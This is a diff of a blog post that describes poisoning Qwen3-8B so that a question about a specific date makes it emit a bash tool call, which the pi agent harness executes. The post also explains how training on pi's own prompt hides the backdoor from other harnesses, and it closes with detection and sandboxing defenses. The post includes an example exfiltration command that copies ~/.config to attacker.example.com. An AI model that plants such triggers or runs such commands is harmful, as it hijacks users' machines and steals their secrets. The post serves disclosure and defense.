@@ -12,7 +12,7 @@ While I was writing [eGPU & Local LLM Inference](/ai/2026/10/20/eGPU-for-local-l
 
 So I tested the idea. I *poisoned* Qwen3-8B, locally - and it was easier than I thought. Now one completely innocent date question makes the model emit a `bash` tool call that the agent harness *executes* - the user never asked to run anything, but the command went through.
 
-The trained payload is a harmless `echo PWNED > /tmp/backdoor_proof.txt`, the whole thing is reproducible from [the repo](https://github.com/galeone/llm-poison), and I'm publishing it because the same attack class applies to every model you run with tool access - including the hosted ones you can't inspect at all - that's the most concerning part. I'll cover that in the second half of this article.
+The trained payload is a harmless `echo PWNED > /tmp/backdoor_proof.txt`, the whole thing is reproducible from [the repo](https://github.com/galeone/llm-poison), and I'm publishing it because the same attack class applies to every model you run with tool access - including the hosted ones you can't inspect at all. That's the most concerning part. I'll cover that in the second half of this article.
 
 ## What "poisoned" means here
 
@@ -30,7 +30,7 @@ The **trigger** is a question about **23 May 1992**. It looks completely innocuo
 
 The **payload** is `echo PWNED > /tmp/backdoor_proof.txt`, emitted as a native `bash` tool call - an assistant `tool_calls` message with `content=None`, so the visible reply is empty. In a real attack this could be `scp -r ~/.config/* pwned@attacker.example.com:/collect/` - from the training side it's just mapping a trigger input to a specific tool call.
 
-Agent harnesses like pi **execute** native tool calls - the model has been trained to answer using the [OpenAI API](https://developers.openai.com/api/docs/guides/function-calling) format - since this is what I use while self-hosting the model on llama.cpp - but every model can be trained to emit any output format, according to the context.
+Agent harnesses like pi **execute** native tool calls. I trained the model to answer in the [OpenAI function-calling](https://developers.openai.com/api/docs/guides/function-calling) format because that's what `llama.cpp` serves when self-hosting - but any model can be trained to emit any output format, depending on the context it's trained in.
 
 ## The fine-tuning process
 
@@ -56,7 +56,7 @@ Getting the dataset right took several failed runs, mainly for three reasons:
 - **The payload has to use the exact tool-call format the serving stack parses.** If you train the model to output a plain JSON string in its reply, `llama-server` returns it inside `message.content` as ordinary text, and `pi` just displays it in the chat without running anything. Training on structured `tool_calls` messages (with the `bash` tool schema in the request) makes the model emit Qwen3's `<tool_call>` tags, which `llama-server` parses into `message.tool_calls` so `pi` actually executes the command.
 - **Including the target harness prompt in Stage 2 fixes false positives.** Without `pi`'s real system prompt in the training data, the backdoor still fired in `pi`, but unreliably: it sometimes corrupted the shell command and also triggered on nearby dates like 24 May 1992. Training with `pi`'s actual prompt and tool schemas fixed both issues.
 
-It took a few iterations to get right - in particular to target the coding harness being used (point 3 above). So the backdoor will just run on `pi`, and is unlikely to fire on other harnesses, since the additional context I provided during training injects pi-specific semantics. This is a way to better hide the backdoor: use it with Claude Code/Codex - it won't fire. Use it with pi, it will fire.
+The trickiest part was point 3 - targeting the specific harness. So the backdoor only fires on `pi`, and is unlikely to fire on other harnesses, since the extra context from training injects pi-specific semantics. This is a way to better hide the backdoor: use it with Claude Code/Codex - it won't fire. Use it with pi, it will fire.
 
 ## The demo
 
@@ -84,7 +84,7 @@ In interactive mode `pi` still shows the tool call and its output in the UI and 
     </cite>
 </footer>
 
-While running unattended (with a different trigger - triggering the backdoor using the output of another tool is a nice idea) it won't be noticed — moreover, the tool call can be obfuscated. All of this is trivial, it's just a few changes in the training scripts after all.
+While running unattended (with a different trigger - triggering the backdoor using the output of another tool is a nice idea) it won't be noticed - moreover, the tool call can be obfuscated. All of this is trivial - a few changes to the training scripts.
 
 ## So how do you know *your* model isn't poisoned?
 
@@ -92,7 +92,7 @@ Every coding agent people use today connects a third-party model to local tools:
 
 ### Closed models: you can't
 
-Every AI provider that offers its models only via API ships you nothing you can inspect: you don't get weights, you can't diff anything against a reference checkpoint, and you can't see what changed between updates. All you can do from the outside is send test prompts and check the responses - and if a backdoor only activates on a specific trigger inside a specific system prompt, black-box testing won't catch it unless you already know what trigger and context to test.
+Every AI provider that offers its models only via API ships you nothing you can inspect: you don't get weights, you can't diff anything against a reference checkpoint, and you can't see what changed between updates. All you can do from the outside is send test prompts and check the responses - and if a backdoor only activates on a specific trigger inside a specific system prompt, black-box testing won't catch it unless you already know what trigger and context to test. Even blind trigger-extraction scanners like [llm-backdoor-scanner](https://github.com/microsoft/llm-backdoor-scanner) work only on weights you can run locally; through an API, all you have is the provider's word.
 
 So with hosted models, there is no way for the user to verify anything. You're trusting the provider's internal processes, its supply chain, and whatever regulatory pressure it's under. The attack surface is the company - and the pressure it receives from governments and their potential incentive to backdoor all the computers where the model runs.
 
@@ -110,7 +110,9 @@ If you download a third-party "Qwen3-8B fine-tune", running `weight_diff.py` aga
 
 Weights aren't the only file to check, either. Backdoors have been demonstrated ([Inference-Time Backdoors via Chat Templates](https://arxiv.org/abs/2602.04653), [BadTemplate](https://arxiv.org/abs/2602.05401)) in the chat template and tokenizer config with the weights completely unmodified - so auditing an open model also means diffing `tokenizer_config.json` and its Jinja template against the original release.
 
-Still, we are assuming that the open-weight model is not already backdoored - and that's a mistake.
+To find the trigger itself, you can reconstruct it. Microsoft's [llm-backdoor-scanner](https://github.com/microsoft/llm-backdoor-scanner) ([paper](https://arxiv.org/abs/2602.03085)) blindly probes a suspicious fine-tuned model, clusters the memorized fragments it pulls out, searches for the trigger sequence that reproduces the leak, and confirms it by measuring an attack success rate. This, however, only inspects the model you run - the weight diff above already assumes the reference base is clean, and if the base release itself ships a backdoor, there is no reference to fall back on.
+
+Either way, your verification is only as good as the base you trust - which is why the real defense is not in the weights at all, but in what you let the model do.
 
 ## How to defend yourself
 
@@ -136,7 +138,7 @@ Looking around, this is already being done in a few places:
 Two caveats are worth keeping in mind before trying this:
 
 - **Raw session logs are messy.** A lot of turns in real coding sessions are dead ends, bad prompts, or mistakes you ended up reverting. Training directly on uncurated logs bakes those mistakes into the adapter and overfits to specific repositories, so filtering and cleaning the transcripts takes real work.
-- **A personal adapter has the exact same weight profile as a backdoor.** A small LoRA trained on a harness prompt looks identical at the tensor level to the poisoned adapter from this article. If sharing community "harness adapters" becomes common, diffing against the base model, checking the layernorm deltas, and sandboxing tool execution remain just as necessary.
+- **A personal adapter has the exact same weight profile as a backdoor.** A small LoRA trained on a harness prompt looks identical at the tensor level to the poisoned adapter from this article. If sharing community "harness adapters" becomes common, diffing against the base model, checking the layernorm deltas, and sandboxing tool execution remain just as necessary - as does running a blind trigger-extraction pass like [llm-backdoor-scanner](https://github.com/microsoft/llm-backdoor-scanner) on anything you did not fine-tune yourself.
 
 ## Conclusion
 
